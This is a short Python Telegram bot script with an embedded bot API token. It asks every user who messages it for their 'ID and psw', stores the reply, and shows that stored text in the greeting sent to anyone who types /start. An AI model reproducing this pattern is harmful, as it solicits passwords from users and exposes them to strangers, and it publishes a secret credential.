import telebot

bot = telebot.TeleBot("1907064165:AAEWy1iEaYPgaKD1z2D0XuF6wYwUoM9M1LY", parse_mode=None)
apple = "apple"

@bot.message_handler(['start', 'help'])
def welcome_message(message):
    bot.reply_to(message, "Hello! " + apple)

@bot.message_handler(content_types=['text'])
def f(message):
    global apple
    bot.reply_to(message, "Send me your ID and psw:")
    apple = message.text

bot.polling()
